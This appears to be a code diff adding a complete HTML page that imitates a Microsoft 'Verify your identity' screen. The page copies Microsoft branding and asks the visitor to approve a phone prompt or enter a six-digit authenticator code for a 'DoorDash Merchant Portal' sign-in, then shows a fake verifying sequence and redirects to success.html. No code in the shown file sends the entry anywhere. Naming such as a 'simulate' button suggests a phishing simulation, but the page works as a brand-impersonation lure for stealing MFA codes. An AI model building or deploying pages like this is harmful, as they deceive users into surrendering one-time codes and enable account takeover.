@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify your identity - Microsoft account</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 23 23'%3E%3Crect x='1' y='1' width='10' height='10' fill='%23f25022'/%3E%3Crect x='12' y='1' width='10' height='10' fill='%237fba00'/%3E%3Crect x='1' y='12' width='10' height='10' fill='%2300a4ef'/%3E%3Crect x='12' y='12' width='10' height='10' fill='%23ffb900'/%3E%3C/svg%3E">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            color: #1b1b1b;
+        }
+
+        .card {
+            width: 100%;
+            max-width: 440px;
+            background: #ffffff;
+            padding: 44px 44px 32px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            position: relative;
+            min-height: 500px;
+        }
+
+        /* ---------- AUTH VIEW ---------- */
+        .auth-view.hidden {
+            display: none;
+        }
+
+        .ms-logo {
+            width: 108px;
+            height: auto;
+            margin-bottom: 16px;
+        }
+
+        .heading {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 12px;
+        }
+
+        .subheading {
+            font-size: 15px;
+            color: #605e5c;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+
+        .subheading strong {
+            color: #1b1b1b;
+            font-weight: 600;
+            word-break: break-all;
+        }
+
+        /* Info panel explaining the 2FA step */
+        .info-panel {
+            background: #f3f2f1;
+            border-radius: 2px;
+            padding: 16px 18px;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+
+        .info-panel .panel-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 6px;
+        }
+
+        .info-panel .panel-desc {
+            font-size: 13px;
+            color: #605e5c;
+            line-height: 1.5;
+            margin-bottom: 12px;
+        }
+
+        .info-panel .panel-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            color: #1b1b1b;
+        }
+
+        .info-panel .panel-row svg {
+            width: 18px;
+            height: 18px;
+            flex-shrink: 0;
+            color: #0067b8;
+        }
+
+        /* Code entry */
+        .field-wrap {
+            margin-bottom: 4px;
+        }
+
+        .field-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 6px;
+        }
+
+        .code-input {
+            width: 100%;
+            padding: 8px 12px;
+            font-size: 20px;
+            font-family: inherit;
+            letter-spacing: 8px;
+            text-align: center;
+            color: #1b1b1b;
+            background: #ffffff;
+            border: 1px solid #8a8886;
+            border-radius: 2px;
+            outline: none;
+            height: 44px;
+            border-bottom-width: 2px;
+            border-bottom-color: #1b1b1b;
+            transition: border-color 0.12s ease;
+        }
+
+        .code-input::placeholder {
+            letter-spacing: 8px;
+            color: #b8b8b8;
+        }
+
+        .code-input:hover {
+            border-color: #323130;
+            border-bottom-color: #323130;
+        }
+
+        .code-input:focus {
+            border-color: #0067b8;
+            border-bottom-color: #0067b8;
+        }
+
+        .code-input.error {
+            border-color: #a80000;
+            border-bottom-color: #a80000;
+        }
+
+        .error-text {
+            display: none;
+            font-size: 13px;
+            color: #a80000;
+            margin: 8px 0 4px;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .error-text.visible {
+            display: flex;
+        }
+
+        .error-text svg {
+            width: 14px;
+            height: 14px;
+            flex-shrink: 0;
+        }
+
+        /* Radio choice between "approve on phone" and "enter code" */
+        .method-tabs {
+            display: flex;
+            gap: 0;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #e1dfdd;
+        }
+
+        .method-tab {
+            flex: 1;
+            background: none;
+            border: none;
+            border-bottom: 2px solid transparent;
+            padding: 10px 8px;
+            font-size: 14px;
+            font-family: inherit;
+            font-weight: 600;
+            color: #605e5c;
+            cursor: pointer;
+            transition: color 0.12s ease, border-color 0.12s ease;
+            margin-bottom: -1px;
+        }
+
+        .method-tab:hover {
+            color: #1b1b1b;
+        }
+
+        .method-tab.active {
+            color: #0067b8;
+            border-bottom-color: #0067b8;
+        }
+
+        .method-panel {
+            display: none;
+        }
+
+        .method-panel.active {
+            display: block;
+        }
+
+        /* Prompt visual for "approve on phone" */
+        .prompt-visual {
+            text-align: center;
+            padding: 12px 0 20px;
+        }
+
+        .prompt-visual svg {
+            width: 160px;
+            height: 120px;
+        }
+
+        .prompt-visual .prompt-text {
+            font-size: 14px;
+            color: #605e5c;
+            margin-top: 12px;
+            line-height: 1.5;
+        }
+
+        /* Actions */
+        .actions {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            margin-top: 28px;
+        }
+
+        .back-btn {
+            background: #ffffff;
+            border: 1px solid #8a8886;
+            border-radius: 2px;
+            padding: 8px 20px;
+            height: 36px;
+            font-size: 14px;
+            font-family: inherit;
+            font-weight: 400;
+            color: #1b1b1b;
+            cursor: pointer;
+            transition: background 0.12s ease, border-color 0.12s ease;
+        }
+
+        .back-btn:hover {
+            background: #f3f2f1;
+            border-color: #323130;
+        }
+
+        .verify-btn {
+            background: #0067b8;
+            color: #ffffff;
+            font-size: 15px;
+            font-family: inherit;
+            font-weight: 400;
+            border: none;
+            border-radius: 2px;
+            padding: 8px 32px;
+            height: 36px;
+            cursor: pointer;
+            transition: background 0.12s ease, opacity 0.12s ease;
+            min-width: 108px;
+        }
+
+        .verify-btn:hover:not(:disabled) {
+            background: #005da6;
+        }
+
+        .verify-btn:disabled {
+            background: #c8c6c4;
+            color: #f3f2f1;
+            cursor: not-allowed;
+        }
+
+        .secondary-link {
+            display: inline-block;
+            font-size: 13px;
+            color: #0067b8;
+            text-decoration: none;
+            margin-top: 16px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-family: inherit;
+            padding: 4px 0;
+        }
+
+        .secondary-link:hover {
+            text-decoration: underline;
+            color: #004578;
+        }
+
+        /* ---------- LOADING VIEW ---------- */
+        .loading-view {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 60px 0 40px;
+            min-height: 400px;
+        }
+
+        .loading-view.visible {
+            display: flex;
+        }
+
+        .loading-view .ms-logo {
+            margin-bottom: 44px;
+        }
+
+        .ms-spinner {
+            position: relative;
+            width: 44px;
+            height: 44px;
+            margin-bottom: 28px;
+        }
+
+        .ms-spinner span {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #0067b8;
+            top: 50%;
+            left: 50%;
+            margin: -5px 0 0 -5px;
+            opacity: 0;
+            animation: ms-orbit 1.8s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+        }
+
+        .ms-spinner span:nth-child(1) { animation-delay: 0s; }
+        .ms-spinner span:nth-child(2) { animation-delay: 0.225s; background: #4c9cd6; }
+        .ms-spinner span:nth-child(3) { animation-delay: 0.45s; background: #8ac0e3; }
+        .ms-spinner span:nth-child(4) { animation-delay: 0.675s; background: #b8d9ee; }
+        .ms-spinner span:nth-child(5) { animation-delay: 0.9s; background: #d6e9f5; }
+
+        @keyframes ms-orbit {
+            0% {
+                transform: translate(0, -18px) scale(0.6);
+                opacity: 0;
+            }
+            20% {
+                opacity: 1;
+            }
+            60% {
+                transform: translate(0, 0) scale(1);
+                opacity: 1;
+            }
+            100% {
+                transform: translate(0, 0) scale(0.4);
+                opacity: 0;
+            }
+        }
+
+        .loading-text {
+            font-size: 15px;
+            color: #605e5c;
+            font-weight: 400;
+            text-align: center;
+        }
+
+        /* Footer help strip */
+        .ms-footer {
+            width: 100%;
+            max-width: 440px;
+            display: flex;
+            justify-content: flex-end;
+            padding: 12px 4px 0;
+            font-size: 12px;
+            color: #605e5c;
+        }
+
+        .ms-footer a {
+            color: #605e5c;
+            text-decoration: none;
+            margin-left: 16px;
+        }
+
+        .ms-footer a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 0;
+                justify-content: flex-start;
+                background: #ffffff;
+            }
+            .card {
+                box-shadow: none;
+                padding: 24px 24px 16px;
+                min-height: auto;
+            }
+            .loading-view {
+                min-height: 300px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+
+        <!-- ================= AUTH VIEW ================= -->
+        <div class="auth-view" id="authView">
+            <!-- Microsoft logo -->
+            <svg class="ms-logo" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg" aria-label="Microsoft">
+                <rect x="0" y="1" width="10" height="10" fill="#f25022"/>
+                <rect x="11" y="1" width="10" height="10" fill="#7fba00"/>
+                <rect x="0" y="12" width="10" height="10" fill="#00a4ef"/>
+                <rect x="11" y="12" width="10" height="10" fill="#ffb900"/>
+                <text x="26" y="19" font-family="Segoe UI, sans-serif" font-size="18" font-weight="600" fill="#5e5e5e">Microsoft</text>
+            </svg>
+
+            <h1 class="heading">Verify your identity</h1>
+            <p class="subheading">
+                A sign-in attempt was made from a new device. Confirm it's you to continue to <strong>DoorDash Merchant Portal</strong>.
+            </p>
+
+            <!-- Two methods: approve on phone OR enter code -->
+            <div class="method-tabs" role="tablist">
+                <button class="method-tab active" id="tabApprove" type="button" role="tab" aria-selected="true">
+                    Approve on phone
+                </button>
+                <button class="method-tab" id="tabCode" type="button" role="tab" aria-selected="false">
+                    Enter code
+                </button>
+            </div>
+
+            <!-- Method 1: approve via Microsoft Authenticator -->
+            <div class="method-panel active" id="panelApprove">
+                <div class="info-panel">
+                    <div class="panel-title">Approve sign-in with Microsoft Authenticator</div>
+                    <div class="panel-desc">
+                        Open the Microsoft Authenticator app on your phone and approve the request. Don't approve if you didn't request this.
+                    </div>
+                    <div class="panel-row">
+                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <rect x="5" y="2" width="14" height="20" rx="3" stroke="currentColor" stroke-width="1.8"/>
+                            <line x1="10" y1="18" x2="14" y2="18" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+                        </svg>
+                        <span>Check your phone for a notification</span>
+                    </div>
+                </div>
+
+                <div class="prompt-visual">
+                    <svg viewBox="0 0 160 120" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                        <!-- Phone -->
+                        <rect x="55" y="10" width="50" height="90" rx="8" fill="#ffffff" stroke="#8a8886" stroke-width="2"/>
+                        <rect x="62" y="22" width="36" height="6" rx="3" fill="#e1dfdd"/>
+                        <rect x="62" y="34" width="36" height="6" rx="3" fill="#e1dfdd"/>
+                        <!-- Approve button inside phone -->
+                        <rect x="62" y="62" width="36" height="14" rx="7" fill="#0067b8"/>
+                        <text x="80" y="72" font-family="Segoe UI, sans-serif" font-size="7" font-weight="600" fill="#ffffff" text-anchor="middle">Approve</text>
+                        <!-- Deny button inside phone -->
+                        <rect x="62" y="80" width="36" height="12" rx="6" fill="none" stroke="#8a8886" stroke-width="1"/>
+                        <text x="80" y="88" font-family="Segoe UI, sans-serif" font-size="6" fill="#605e5c" text-anchor="middle">Deny</text>
+                    </svg>
+                    <div class="prompt-text">
+                        Approve the request in your authenticator app to continue.
+                    </div>
+                </div>
+
+                <button class="secondary-link" id="simulateApproveBtn" type="button">
+                    I've approved the request
+                </button>
+            </div>
+
+            <!-- Method 2: enter 6-digit code -->
+            <div class="method-panel" id="panelCode">
+                <div class="field-wrap">
+                    <label class="field-label" for="codeInput">Code</label>
+                    <input
+                        class="code-input"
+                        id="codeInput"
+                        type="text"
+                        inputmode="numeric"
+                        maxlength="6"
+                        placeholder="000000"
+                        autocomplete="one-time-code"
+                        aria-label="Enter the 6-digit code"
+                    >
+                </div>
+
+                <p class="error-text" id="errorText">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.8"/>
+                        <line x1="12" y1="7" x2="12" y2="13" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+                        <circle cx="12" cy="16.5" r="1" fill="currentColor"/>
+                    </svg>
+                    <span id="errorMessage">Please enter the 6-digit code from your authenticator app.</span>
+                </p>
+
+                <p class="secondary-link" style="cursor: default;">
+                    Open your Microsoft Authenticator app to view the code.
+                </p>
+            </div>
+
+            <!-- Actions -->
+            <div class="actions">
+                <button class="back-btn" id="backBtn" type="button">Back</button>
+                <button class="verify-btn" id="verifyBtn" type="button" disabled>Verify</button>
+            </div>
+        </div>
+
+        <!-- ================= LOADING VIEW ================= -->
+        <div class="loading-view" id="loadingView">
+            <svg class="ms-logo" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg" aria-label="Microsoft">
+                <rect x="0" y="1" width="10" height="10" fill="#f25022"/>
+                <rect x="11" y="1" width="10" height="10" fill="#7fba00"/>
+                <rect x="0" y="12" width="10" height="10" fill="#00a4ef"/>
+                <rect x="11" y="12" width="10" height="10" fill="#ffb900"/>
+                <text x="26" y="19" font-family="Segoe UI, sans-serif" font-size="18" font-weight="600" fill="#5e5e5e">Microsoft</text>
+            </svg>
+
+            <div class="ms-spinner" aria-hidden="true">
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+
+            <p class="loading-text" id="loadingText">Verifying…</p>
+        </div>
+
+    </div>
+
+    <div class="ms-footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy &amp; cookies</a>
+        <a href="#">•••</a>
+    </div>
+
+    <script>
+        // ---- Views ----
+        const authView = document.getElementById('authView');
+        const loadingView = document.getElementById('loadingView');
+        const loadingText = document.getElementById('loadingText');
+
+        function showLoading() {
+            authView.classList.add('hidden');
+            loadingView.classList.add('visible');
+            loadingText.textContent = 'Verifying…';
+        }
+
+        // ---- Method tabs ----
+        const tabApprove = document.getElementById('tabApprove');
+        const tabCode = document.getElementById('tabCode');
+        const panelApprove = document.getElementById('panelApprove');
+        const panelCode = document.getElementById('panelCode');
+        const verifyBtn = document.getElementById('verifyBtn');
+
+        function setActiveMethod(method) {
+            if (method === 'approve') {
+                tabApprove.classList.add('active');
+                tabCode.classList.remove('active');
+                tabApprove.setAttribute('aria-selected', 'true');
+                tabCode.setAttribute('aria-selected', 'false');
+                panelApprove.classList.add('active');
+                panelCode.classList.remove('active');
+                verifyBtn.disabled = true; // requires clicking "I've approved"
+            } else {
+                tabCode.classList.add('active');
+                tabApprove.classList.remove('active');
+                tabCode.setAttribute('aria-selected', 'true');
+                tabApprove.setAttribute('aria-selected', 'false');
+                panelCode.classList.add('active');
+                panelApprove.classList.remove('active');
+                verifyBtn.disabled = codeInput.value.trim().length !== 6;
+            }
+        }
+
+        tabApprove.addEventListener('click', () => setActiveMethod('approve'));
+        tabCode.addEventListener('click', () => setActiveMethod('code'));
+
+        // ---- Code input ----
+        const codeInput = document.getElementById('codeInput');
+        const errorText = document.getElementById('errorText');
+        const errorMessage = document.getElementById('errorMessage');
+
+        function showError(msg) {
+            errorMessage.textContent = msg;
+            errorText.classList.add('visible');
+            codeInput.classList.add('error');
+            codeInput.focus();
+        }
+
+        function clearError() {
+            errorText.classList.remove('visible');
+            codeInput.classList.remove('error');
+        }
+
+        codeInput.addEventListener('input', () => {
+            // Keep only digits
+            codeInput.value = codeInput.value.replace(/\D/g, '').slice(0, 6);
+            clearError();
+            verifyBtn.disabled = codeInput.value.length !== 6;
+        });
+
+        codeInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && !verifyBtn.disabled) {
+                e.preventDefault();
+                verifyBtn.click();
+            }
+        });
+
+        // ---- Approve simulation ----
+        document.getElementById('simulateApproveBtn').addEventListener('click', () => {
+            // Simulate the user approving on their phone → enable Verify
+            verifyBtn.disabled = false;
+        });
+
+        // ---- Verify ----
+        verifyBtn.addEventListener('click', () => {
+            const activeMethod = tabApprove.classList.contains('active') ? 'approve' : 'code';
+
+            if (activeMethod === 'code') {
+                const code = codeInput.value.trim();
+                if (code.length !== 6) {
+                    showError('Please enter the 6-digit code from your authenticator app.');
+                    return;
+                }
+            }
+
+            // Show the Microsoft-style loading screen
+            showLoading();
+
+            const steps = [
+                { delay: 600,  text: 'Verifying your identity…' },
+                { delay: 1300, text: 'Confirming it\'s you…' },
+                { delay: 2000, text: 'Almost done…' }
+            ];
+
+            steps.forEach(step => {
+                setTimeout(() => {
+                    loadingText.textContent = step.text;
+                }, step.delay);
+            });
+
+            // After the loading sequence, go to success page
+            setTimeout(() => {
+                window.location.href = 'success.html';
+            }, 2700);
+        });
+
+        // ---- Back button ----
+        document.getElementById('backBtn').addEventListener('click', () => {
+            if (document.referrer) {
+                window.location.href = document.referrer;
+            } else {
+                window.location.href = 'index.html';
+            }
+        });
+    </script>
+</body>
+</html>
